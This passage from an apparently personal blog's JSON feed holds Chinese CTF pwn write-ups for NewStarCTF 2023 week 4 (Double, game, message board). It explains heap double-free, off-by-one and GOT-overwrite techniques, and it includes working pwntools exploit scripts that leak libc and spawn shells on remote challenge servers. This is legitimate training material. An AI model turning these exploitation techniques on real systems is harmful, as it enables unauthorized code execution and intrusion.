data-num=\"56\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token operator\">|</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>free_g<span class=\"token operator\">|</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "heap",
                "tcache",
                "dup",
                "IO_FILE",
                "calloc",
                "fini_array"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/10/newstarctf2023-week4/",
            "url": "http://waltcsz.github.io/2023/10/newstarctf2023-week4/",
            "title": "newstarctf2023 week4",
            "date_published": "2023-10-19T17:20:21.000Z",
            "content_html": "<h1 id=\"newstartctf2023_week4-pwn\"><a class=\"markdownIt-Anchor\" href=\"#newstartctf2023_week4-pwn\">#</a> newstartctf2023_week4 pwn</h1>\n<h2 id=\"double\"><a class=\"markdownIt-Anchor\" href=\"#double\">#</a> Double</h2>\n<p>堆 heap, double_free, fastbin</p>\n<p>libc: 2.23</p>\n<p>程序中功能选择只有创建 <code>add()</code> ，删除 <code>del()</code>  和检查 <code>check()</code> 。其中， <code>check()</code>  内存在后门函数，只要 0x602070 处的值为 1638，即可直接 getsshell。</p>\n<p>其次， <code>del()</code>  中释放块后没有清除指针，可以进行 double free。因此只要在 0x602070 处伪造块，并设置值为 1638。</p>\n<p><code>add()</code>  中固定分配 0x28 大小的块，并且同时写入内容。释放后进入 fastbin。</p>\n<blockquote>\n<p>实际占用 0x30 空间，释放后进入 fastbin [1]</p>\n</blockquote>\n<h3 id=\"步骤\"><a class=\"markdownIt-Anchor\" href=\"#步骤\">#</a> 步骤</h3>\n<p>分配 2 个 chunk，序号分别为 0、1，然后按 0、1、0 的顺序释放 chunk，这样 0 号 chunk 在 fastbin 中存在 2 次构成闭环。</p>\n<pre><code>fastbin[1] -&gt; chunk0 -&gt; chunk1 -&gt; chunk0 (-&gt;chunk1)\n</code></pre>\n<p>再次分配一个块，此时分配到 0 号 chunk，在其中输入 0x602070 的编码。此时 fastbin [1] 中即为：</p>\n<pre><code>fastbin[1] -&gt; chunk1 —&gt; chunk0 -&gt; 0x602070\n</code></pre>\n<p>再分配 3 次，在第 3 次时输入内容 1638，然后选择进入 <code>check()</code> 。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25043</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./Double_pe')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *0x400B3C')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x602070</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token number\">1638</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'>\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input idx\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input content\\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input idx\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>target<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"game\"><a class=\"markdownIt-Anchor\" href=\"#game\">#</a> game</h2>\n<p>NULL_byte_off-by-one in stack, libc 偏移</p>\n<p>或许这道题属于 re？而且这道题含 utf-8 字符，写脚本还不好写。</p>\n<h3 id=\"程序流程\"><a class=\"markdownIt-Anchor\" href=\"#程序流程\">#</a> 程序流程</h3>\n<p>程序大致流程如下：</p>\n<ul>\n<li>先选择角色，选择三月七或派蒙。</li>\n<li>然后进入主循环。主循环中，可以选择送原石（接委托）或者送 kfc 联名套餐（对肯德基爷爷说话）。其中，原神玩家只能接委托，崩铁玩家只能对肯德基爷爷说话，否则都会直接退出。</li>\n<li>接委托中，会让 v7 增加 0x10000（起始为 0）。其次，如果 v7 大于 0x3ffff，即执行了 4 次以上委托，就会泄露 system 函数的地址。</li>\n<li>对话中，使用 read 函数向栈上输入值。这里存在漏洞，如果没有输入回车作为结尾，会自动在字符串最后添加 <code>'\\0'</code> ，在输入 8 个非回车字节后直接覆盖第 9 字节，可以修改相邻的变量。而该变量标识了玩家选择的角色，1 为三月七，0 为派蒙。覆盖为 0 后，可以从对话转为接委托。</li>\n</ul>\n<p><img data-src=\"./image-20231019173000077.png\" alt=\"image-20231019173000077\"></p>\n<h3 id=\"漏洞\"><a class=\"markdownIt-Anchor\" href=\"#漏洞\">#</a> 漏洞</h3>\n<p>在主函数最后，会执行 <code>&amp;puts-v3-v7</code>  处的函数，以 v5 作为变量。因此调整对应函数地址为 system 的地址，让 v5 指向 <code>&quot;/bin/sh\\0&quot;</code> ，即可实现 getshell。</p>\n<p>其中，进入该分支的前提是，主菜单选择时输入 3，并且执行过接委托和对话。而利用 read 函数处的漏洞即可实现。v7 的值即执行委托时累加的值，v3 的值当场输入，但只能输入 short 类型，即只能输入范围在 - 32768~32767 的值。</p>\n<p><img data-src=\"./image-20231019173843622.png\" alt=\"image-20231019173843622\"></p>\n<h4 id=\"计算偏移\"><a class=\"markdownIt-Anchor\" href=\"#计算偏移\">#</a> 计算偏移</h4>\n<p>首先计算 puts 函数和 system 函数的偏移。这个利用题目所给的 libc.so.6 文件即可直接算出，不需要先泄露再去计算，因为这边只需要偏移不需要绝对地址。所以接委托中泄露 system 地址的功能可有可无。利用 pwintools 算一算。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.31.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>puts_a <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"puts: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>puts_a<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, system: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>sys_a<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#bs_a = libcbase + next(libc.search(b'/bin/sh'))</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>offset <span class=\"token operator\">=</span> puts_a <span class=\"token operator\">-</span> sys_a</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"offset: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>offset<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    v3 <span class=\"token operator\">=</span> offset <span class=\"token operator\">-</span> i<span class=\"token operator\">*</span><span class=\"token number\">0x10000</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">: v3=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>v3<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231019174341968.png\" alt=\"image-20231019174341968\"></p>\n<p>两者偏移为 205200，只有在 v7 为 0x30000 时，v3 才能控制在 short 范围内，即 8592。</p>\n<p>v5 的值即为与肯德基老爷爷对话的内容，所以对话时输入 <code>&quot;/bin//sh&quot;</code> ，刚好 8 字节。</p>\n<blockquote>\n<p>懒得写脚本实现了，不然我更喜欢 /bin/sh\\0</p>\n</blockquote>\n<p><img data-src=\"./image-20231019174720038.png\" alt=\"image-20231019174720038\"></p>\n<h2 id=\"message-board\"><a class=\"markdownIt-Anchor\" href=\"#message-board\">#</a> message board</h2>\n<p>scanf 漏洞，got 劫持</p>\n<p>主函数中，存在任意地址写入，但首先会经过 board 函数。</p>\n<p>在 board 函数中，可以自定义选择往栈上利用 scanf 输入最多 15 个字节。接着，会要求输入 puts 的真实地址，输入错误直接结束程序。</p>\n<h3 id=\"泄露地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露地址\">#</a> 泄露地址</h3>\n<p>scanf 函数可以利用非数字字符跳过输入，而这样的操作不会改变对应地址原本的值。但是如果输入大部分非数字字符，scanf 读取后跳过，但不会将该字符从缓冲区中拿走，因此，该程序后续的所有 scanf 都会直接跳过，包括要求输入 puts 地址的。但是，如果输入的是 <code>'+'</code> ，那么只会忽略当前的 <code>&quot;%d&quot;</code> ，应该是因为 + 作为正负号吧。</p>\n<p>跳过大量 scanf，我们可以拿到很多栈上数据。</p>\n<p><img data-src=\"./image-20231019180236594.png\" alt=\"image-20231019180236594\" style=\"zoom:50%;\" /><img data-src=\"./image-20231019180408010.png\" alt=\"image-20231019180408010\"></p>\n<p>其中，可以通过黄色的地址推算栈上地址。可以通过紫色地址推算 libc 基址。</p>\n<p>利用 <code>_IO_2_1_stdeer_</code> 推算 libc 基地址，然后查库算出 puts 真实地址并输入，即可进入主函数。</p>\n<p>在主函数中，由于没有对下标进行检测，所以我们拥有两次修改任意地址 4 字节的机会。但由于输入均为输入 32 位整数，且 a 数组处于.bss 段，所以够不到 libc 处或者栈空间，但是可以够到 got 表，且只开了 Partial RELRO 保护，got 可写。<img data-src=\"./image-20231019181238330.png\" alt=\"image-20231019181238330\" style=\"zoom:67%;\" /></p>\n<p>在主函数最后执行了 <code>exit(0)</code> ，因此我们可以将 got 表中 exit 的值修改为 one_gadget，便可以直接执行 getshell。</p>\n<h3 id=\"计算下标\"><a class=\"markdownIt-Anchor\" href=\"#计算下标\">#</a> 计算下标</h3>\n<p>a 数组的地址为 0x4040A0，而 got 表 exit 项的地址为 0x404030，因此偏移为 <code>offset=0x404030-0x4040A0=-0x70</code> ，下标应为 <code>idx=offset/4=-0x70/0x4=-0x1c=-28</code> 。而 one_gadget 长度超过 4 字节，应分两次写入，刚好用完两次机会。第一次往 <code>idx=-28</code>  处写入地址低 4 位字节 <code>onegadget&amp;0xffffffff</code> ，第二次往 <code>idx+1=-27</code>  处写入高 4 位字节 <code>onegadget&gt;&gt;32</code> 。</p>\n<h3 id=\"one_gadget获取\"><a class=\"markdownIt-Anchor\" href=\"#one_gadget获取\">#</a> one_gadget 获取</h3>\n<p>利用 one_gadget 工具。获取了该 libc 版本的 3 个 one_gadget。</p>\n<p><img data-src=\"./image-20231019182348766.png\" alt=\"image-20231019182348766\"></p>\n<p>在程序运行到最后 exit 时，rdi 和 rsi 寄存器值为 0，可以使用第三个 one_gadget。</p>\n<p><img data-src=\"./image-20231019182306437.png\" alt=\"image-20231019182306437\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn_pe')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28040</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *0x401336')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset </pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#p.send(payload)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'15'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>strerr <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>stack1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'+'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'is '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        strerr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token number\">12</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        stack1 <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"strerr:%#x, stack:%#x\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>strerr<span class=\"token punctuation\">,</span>stack1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.31.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>libcbase <span class=\"token operator\">=</span> strerr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#if offine, libcbase need add 0x30</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>puts_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#rtld = libcbase + libc.sym['_rtld_global']</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rtld <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x222030</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>one_gadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xe3b01</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>exit_hook <span class=\"token operator\">=</span> rtld <span class=\"token operator\">+</span> <span class=\"token number\">3848</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>exit_g <span class=\"token operator\">=</span> <span class=\"token number\">0x404030</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token number\">0x4040A0</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>exit_g<span class=\"token operator\">-</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Now please enter the verification code\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>puts_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 